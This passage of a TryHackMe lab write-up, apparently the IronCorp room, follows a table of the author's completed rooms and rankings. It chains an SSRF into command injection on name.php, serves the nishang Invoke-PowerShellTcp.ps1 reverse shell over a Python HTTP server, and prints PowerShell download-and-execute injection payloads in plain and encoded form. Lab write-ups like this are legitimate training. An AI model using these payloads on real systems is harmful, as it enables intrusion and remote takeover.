|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ   |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ   |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ   |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ   |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ   |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ   |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ   |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   106ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/82394e66-fac3-4859-a8c1-741648fb81b6"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/3ac6206c-6e40-4a38-b3e4-fd2e479b4f3e"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/342b205d-bbed-428f-b07a-1b245472ed97"><br><br>
                  Global monthly:    312ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/e26a6034-c1b9-44ad-8326-8a0bb50b7fbd"><br><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2bb3e977-43f8-4a15-b07f-1829025bb94b"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>



<img width="1137" height="562" alt="image" src="https://github.com/user-attachments/assets/40f38dfe-1558-4ed4-af01-a5fea68b255f" />

<br>
<br>

<img width="1123" height="177" alt="image" src="https://github.com/user-attachments/assets/9bdb5649-1394-403b-8791-e441eed49867" />


<br>
<br>

<img width="1131" height="422" alt="image" src="https://github.com/user-attachments/assets/608bfc07-77ca-4c7a-a9a0-7dc1ed7ba4b7" />























<br>
<br>

<p align="center">/vendor</p>

<img width="1102" height="211" alt="image" src="https://github.com/user-attachments/assets/d36e5122-52fc-498f-842a-f7cc1f8e5a65" />


<p  align="center">admin.ironcorp.me:11025</p>

<img width="1134" height="716" alt="image" src="https://github.com/user-attachments/assets/fd1b1996-a020-4c34-9190-6589b44f9e86" />

<br>
<br>

<p  align="center">admin.ironcorp.me:11025</p>

<img width="1127" height="680" alt="image" src="https://github.com/user-attachments/assets/805b1a3a-f6f2-444b-b08c-7eaff6955d20" />

<br>
<br>
<h1 align="center">Command & Control (C2)</h1>

<br>
<p  align="center">Search = <code>internal.ironcorp.me:8080</code></p>

<img width="1130" height="671" alt="image" src="https://github.com/user-attachments/assets/b4f5eb98-454c-472f-bf4a-fa24fc4b34f5" />

<br>
<br>
<p align="center">Search = <code>internal.ironcorp.me:11025....</code></p>

<img width="1129" height="202" alt="image" src="https://github.com/user-attachments/assets/820f7a68-76bb-45c2-a6b9-f4aa6cf3167a" />

<br>
<br>
<p align="center">Search = <code>internal.ironcorp.me:11025....</code></p>

<img width="966" height="243" alt="image" src="https://github.com/user-attachments/assets/060e069b-f1c9-491f-ad0c-0864b2baa3fd" />

<br>
<br>
<p align="center">Search = <code>internal.ironcorp.me:11025....</code></p>

<img width="1129" height="325" alt="image" src="https://github.com/user-attachments/assets/52facf0a-9ba8-4576-96fc-37caa817e1ca" />

<br>
<br>
<p align="center">internal.ironcorp.me:11025/name.php?name=</p>

<img width="678" height="231" alt="image" src="https://github.com/user-attachments/assets/141cfcae-1816-4f1c-83c7-ad01b8137582" />

<br>
<br>

<p align="center">admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi</p>

<img width="1245" height="340" alt="image" src="https://github.com/user-attachments/assets/2a30456e-3b84-4a54-a88f-8717b2c96d9d" />

<br>
<br>
<p align="center">Search = <code>internal.ironcorp.me:11025....</code></p>

<img width="1220" height="278" alt="image" src="https://github.com/user-attachments/assets/076d2762-3b84-46c9-9c15-94dec7d8b43b" />

<br>
<br>

<p align="center">admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi|whoami</p>

<img width="1214" height="248" alt="image" src="https://github.com/user-attachments/assets/9fe97888-e6ca-4e22-91ac-269ac63e1c86" />

<br>
<br>

```bash
:~/IronCorp# git clone https://github.com/samratashok/nishang.git
```

```bash
:~/IronCorp# cd nishang
```

```bash
~/IronCorp/nishang# ls
ActiveDirectory  Bypass         DISCLAIMER.txt  Gather   MITM          powerpreter  Scan
Antak-WebShell   CHANGELOG.txt  Escalation      LICENSE  nishang.psm1  Prasadhak    Shells
Backdoors        Client         Execution       Misc     Pivot         README.md    Utility
```

```bash
:~/IronCorp/nishang# cd Shells
```

```bash
:~/IronCorp/nishang/Shells# ls
Invoke-ConPtyShell.ps1  Invoke-PoshRatHttp.ps1     Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcatAgent.ps1
Invoke-JSRatRegsvr.ps1  Invoke-PoshRatHttps.ps1    Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellUdp.ps1         Invoke-PsGcat.ps1
Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1             Invoke-PowerShellWmi.ps1         Remove-PoshRat.ps1
```

<br>

```bash
:~/IronCorp/nishang/Shells# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<h3 align="center">ironcorp.me:8080/login.html</h3>

<img width="1056" height="509" alt="image" src="https://github.com/user-attachments/assets/d828e3b1-9a44-44e0-9a56-9b00096c7ca1" />

<br>
<br>

<h3 align="center">ironcorp.me:11025</h3>

<img width="1062" height="351" alt="image" src="https://github.com/user-attachments/assets/15487d11-affb-4284-a147-0a8074d3b687" />

<br>
<br>

<img width="1062" height="320" alt="image" src="https://github.com/user-attachments/assets/85872486-4a9a-4337-8340-21d9369b4a2c" />

<br>
<br>

<img width="1200" height="645" alt="image" src="https://github.com/user-attachments/assets/b669a368-1610-4d97-9721-dd2185b01baa" />



<br>
<br>

<img width="1200" height="636" alt="image" src="https://github.com/user-attachments/assets/c395a147-5819-4c0d-95a5-106719691c5e" />

<br>
<br>

<img width="1195" height="505" alt="image" src="https://github.com/user-attachments/assets/ce5bcf6d-4983-443a-8521-9fad53161fc0" />

<br>
<br>

<h3 align="center">Burp Suite, Repeater</h3>

<img width="1191" height="209" alt="image" src="https://github.com/user-attachments/assets/4ff48264-3d11-4720-9f66-bf45151a2b37" />

<br>
<br>

<img width="1188" height="382" alt="image" src="https://github.com/user-attachments/assets/30bbb507-dd18-4fd7-b735-fcd74cc907bc" />

<br>
<br>

<img width="1171" height="629" alt="image" src="https://github.com/user-attachments/assets/5eff7c69-215d-434a-9611-06ddc20ad92c" />

<br>
<br>

<h3 align="center">http server</h3>

```bash
:~/IronCorp# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
http://admin.ironcorp.me:11025/?r=http%3A%2F%2F10.201.90.153%3A8000%2FInvoke-PowerShellTcp.ps1#
```

```bash
http://internal.ironcorp.me:11025/name.php?name=hi|whoami
```


```bash
http://internal.ironcorp.me:11025/name.php?name=hi|powershell.exe -c iex(new-object system.net.webclient).downloadstring('http://10.201.118.153:8000/Invoke-PowerShellTcp.ps1'/
```

```bash
http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%30%25%32%64%25%36%35%25%37%38%25%36%35%25%36%33%25%32%30%25%36%32%25%37%39%25%37%30%25%36%31%25%37%33%25%37%33%25%32%30%25%32%64%25%36%33%25%32%30%25%32%32%25%32%38%25%34%65%25%36%35%....%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39%25%37%63%25%36%39%25%36%35%25%37%38%25%32%32
```


```bash
http://internal.ironcorp.me:11025/name.php?name=hi|Invoke-PowerShellTcp.ps1
```

<img width="961" height="73" alt="image" src="https://github.com/user-attachments/assets/2a2db5bd-f7d7-4605-9d3c-984e81ded5d2" />

<br>
<br>

<img width="1129" height="505" alt="image" src="https://github.com/user-attachments/assets/412250fc-e92a-4dcd-8d4b-500657ec7dfe" />

<br>
<br>

```bash
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.201.28.78/Invoke-PowerShellTcp.ps1')
```

```bash
http://internal.ironcorp.me:11025/name.php?name=hello|%25%37%30%...%33%31%25%32%37%25%32%39
```

```bash
/?r=http://internal.ironcorp.me:11025/name.php?name=hello|%25%37%30%...%33%31%25%32%37%25%32%39
```

<h3 align="center">Invoke-Powershell</h3>

<img width="862" height="313" alt="image" src="https://github.com/user-attachments/assets/a5ed30ba-3a31-4fcb-85cf-23f04bee0d3c" />

<br>
<br>
